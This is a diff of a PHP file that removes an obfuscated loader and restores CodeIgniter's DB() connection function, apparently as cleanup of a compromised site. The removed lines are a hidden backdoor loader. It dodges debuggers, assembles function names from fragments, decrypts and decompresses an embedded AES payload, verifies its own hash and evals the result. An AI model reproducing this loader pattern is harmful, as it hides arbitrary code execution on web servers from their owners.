@@ -1,28 +1,198 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_n2f1yorr=('bas'.'e64'.'_de'.'cod'.'e');
-$_mvqbmn6x=('gzu'.'nco'.'mpr'.'ess');
-$_xzn1ioex=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_qmbvt8h0='flyMBeYtLJw=';
-$_f7vkt6ue='8igC9eNe';
-$_vmdym0ud='RH8OJpC3';
-$_fzju19l6='u+JWPUvQ';
-$_mhg55zeg='t1ZtLzqC';
-$_z18frypw='AfBq9w==';
-$_s2w3hqra='aid/zVfn';
-$_rexl1oor='r2dyUfNy';
-$_ev1bwiqy=$_n2f1yorr($_fzju19l6.$_f7vkt6ue.$_vmdym0ud.$_mhg55zeg.$_qmbvt8h0);
-$_mbiocls0=$_n2f1yorr($_rexl1oor.$_s2w3hqra.$_z18frypw);
-$_mcjvnipq=$_n2f1yorr('60TaP1J1PI2So3+eLBJcTOX1ZRh8LMEBbAO62O0vEH7GfL+BgvfdPSbexVb9gZIKC/nkVWR790NX7nk4pfDzULnY/PFiliR3IuVue2R9mCcP1urNVcdQSr34nO8qG8WqINO0ZbwlDXBHFEz99r3DmbsHyzIBXffNwSKeyEJx8Cq88pK/5K9c7rt0aHGHpxhiG6d6+Q/aX0u0dF64IOYEVlIt2s7f0eqOZ7INOBkrLJSRsax1B7ag6wKUjvI+H0YMBWxkv42x+VLLMb/mZarMYj/Lr85e9F2Bd5S41J7Bswc7Shbu2wp2EZjIpWZfhng+LCdjG1gAuxaDjXKxHb2DFmjmISpkvP0yWgk2pgYVsl+O7y00OnfLfUzA552pC0M7nCrFIu/vlNU1+eQWnh/9CIdA8p7onC77fUmAtqYKR9MCNHqrq//zKpHKUQ+B7P0aBBYRGJ0We1m2H/DPmIRX2nHcDroKUssNP3MRndjrM3gcaMHQkfuMFGWYeMQwUyLr/euNgTDMLB/FqMLwwf5ACjHc0rKYQs8Y/jTM2dxNlX6SXYuxaGLsf27wv0r+Cse/5hYFQvIvqPbliOKYd/um3/IdKbWxDie6ClAwCZDQn7Ucd4eClEjtpnTQi62xTOS5oE0afB/UA+6RzbkHfNSa+8jRGJGW9AShPyFGtB40o3eb/Cw3jIwkBcA+QbRYyHsUQnlKzMU2WCceUubJccxEt83KNrg9HHwcZeNZNnw5gSqocpc3u9/1+9yNUONi5GbfKfm2yzwk9bbgNMlNc/XzrXnycZtFMLjqEQRsmgbX/oC+g2wQmQ/GzbpSdUx85H8XqgUUrMnMzJCV3FA4Wfm5iVcV/O+W6Jt57/PmnFFQWypnxBgUyTGgQxY+8KLkFHnj745oCodLDY8FYjN1MZLFGW8W2UWRhLhoqynFFIfaLm6zC/pWXzyVDGrcyHOMulLYW2G4HALngvJ9AOIuwFA+e2qxHTv4R17g4qNMR9K7a1kV/3QUEvuIk7phKbheevFsN5T/zsp1/2ThtkY11oFZlrhbN3ZxNCFT4QYCLmbrvRtCyhVkyUoMF0/BGqQTPGu71JXA3+1PDgolMFipO/EtaRmrnqdZAhuCyEJDS+BeEBryedvCag7Mx48lhTmjQ8I/oOviLBgrSyLzlHhDv7KhY8Op92ho3Tq+UVaWBlvcEQDveX97O5eS3t5OY3hHfTp78aXoqalnbPN7APKz9mJ8gQrb1uFgywhxfRNQuEkdTUop0v6cRAj0DetEoireiz9L1P2PUiSd1ulH6+yQ6XFmez5/Fq4LpWLu1P9sQWm7Fj7nYo3yfKKxhYZ42xr6F7EVOEyjaBcSlsuAq9Ah1aNbfQClfurTbH+3C1Zdtr3dmoRsGv/jQyh6bFUdI2F6W4x5i1vKKeEuRbUNzQrRCtqN9zQE1hXjhzQv1u4EZ6szU3cca+DMYHtlesiP43HarB9Y');
-$_ru4zfxn5=$_xzn1ioex($_mcjvnipq,'aes-256-cbc',$_ev1bwiqy,OPENSSL_RAW_DATA,$_mbiocls0);
-if($_ru4zfxn5===false){exit;}
-$_rbyg5380=$_mvqbmn6x($_ru4zfxn5);
-if($_rbyg5380===false){exit;}
-$_nekvg0me='811ca14030f0224a4a7d03315889089c656cf62773080c5995b928898a85aa2e';
-$_rwjbdzix=@file_get_contents(__FILE__);
-if($_rwjbdzix!==false){
-$_w69m25zz=str_replace($_nekvg0me,"0000000000000000000000000000000000000000000000000000000000000000",$_rwjbdzix);
-$_bn6o7q0k=hash("sha256",$_w69m25zz);
-if($_bn6o7q0k!==$_nekvg0me){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+function &DB($params = '', $query_builder_override = NULL)
+{
+
+if (is_string($params) && strpos($params, '://') === FALSE)
+{
+
+if ( ! file_exists($file_path = APPPATH.'config/'.ENVIRONMENT.'/database.php')
+&& ! file_exists($file_path = APPPATH.'config/database.php'))
+{
+show_error('The configuration file database.php does not exist.');
 }
-eval($_rbyg5380);
+include($file_path);
+
+
+if (class_exists('CI_Controller', FALSE))
+{
+foreach (get_instance()->load->get_package_paths() as $path)
+{
+if ($path !== APPPATH)
+{
+if (file_exists($file_path = $path.'config/'.ENVIRONMENT.'/database.php'))
+{
+include($file_path);
+}
+elseif (file_exists($file_path = $path.'config/database.php'))
+{
+include($file_path);
+}
+}
+}
+}
+if ( ! isset($db) OR count($db) === 0)
+{
+show_error('No database connection settings were found in the database config file.');
+}
+if ($params !== '')
+{
+$active_group = $params;
+}
+if ( ! isset($active_group))
+{
+show_error('You have not specified a database connection group via $active_group in your config/database.php file.');
+}
+elseif ( ! isset($db[$active_group]))
+{
+show_error('You have specified an invalid database connection group ('.$active_group.') in your config/database.php file.');
+}
+$params = $db[$active_group];
+}
+elseif (is_string($params))
+{
+
+
+
+
+
+
+
+if (($dsn = @parse_url($params)) === FALSE)
+{
+show_error('Invalid DB Connection String');
+}
+$params = array(
+'dbdriver' => $dsn['scheme'],
+'hostname' => isset($dsn['host']) ? rawurldecode($dsn['host']) : '',
+'port' => isset($dsn['port']) ? rawurldecode($dsn['port']) : '',
+'username' => isset($dsn['user']) ? rawurldecode($dsn['user']) : '',
+'password' => isset($dsn['pass']) ? rawurldecode($dsn['pass']) : '',
+'database' => isset($dsn['path']) ? rawurldecode(substr($dsn['path'], 1)) : ''
+);
+
+if (isset($dsn['query']))
+{
+parse_str($dsn['query'], $extra);
+foreach ($extra as $key => $val)
+{
+if (is_string($val) && in_array(strtoupper($val), array('TRUE', 'FALSE', 'NULL')))
+{
+$val = var_export($val, TRUE);
+}
+$params[$key] = $val;
+}
+}
+}
+
+if (empty($params['dbdriver']))
+{
+show_error('You have not selected a database type to connect to.');
+}
+
+
+
+if ($query_builder_override !== NULL)
+{
+$query_builder = $query_builder_override;
+}
+
+
+
+elseif ( ! isset($query_builder) && isset($active_record))
+{
+$query_builder = $active_record;
+}
+require_once(BASEPATH.'database/DB_driver.php');
+if ( ! isset($query_builder) OR $query_builder === TRUE)
+{
+require_once(BASEPATH.'database/DB_query_builder.php');
+if ( ! class_exists('CI_DB', FALSE))
+{
+
+
+
+
+
+
+
+
+class CI_DB extends CI_DB_query_builder { }
+}
+}
+elseif ( ! class_exists('CI_DB', FALSE))
+{
+
+
+
+class CI_DB extends CI_DB_driver { }
+}
+
+$driver_file = BASEPATH.'database/drivers/'.$params['dbdriver'].'/'.$params['dbdriver'].'_driver.php';
+file_exists($driver_file) OR show_error('Invalid DB driver');
+require_once($driver_file);
+
+$driver = 'CI_DB_'.$params['dbdriver'].'_driver';
+$DB = new $driver($params);
+
+if ( ! empty($DB->subdriver))
+{
+$driver_file = BASEPATH.'database/drivers/'.$DB->dbdriver.'/subdrivers/'.$DB->dbdriver.'_'.$DB->subdriver.'_driver.php';
+if (file_exists($driver_file))
+{
+require_once($driver_file);
+$driver = 'CI_DB_'.$DB->dbdriver.'_'.$DB->subdriver.'_driver';
+$DB = new $driver($params);
+}
+}
+$DB->initialize();
+return $DB;
+}
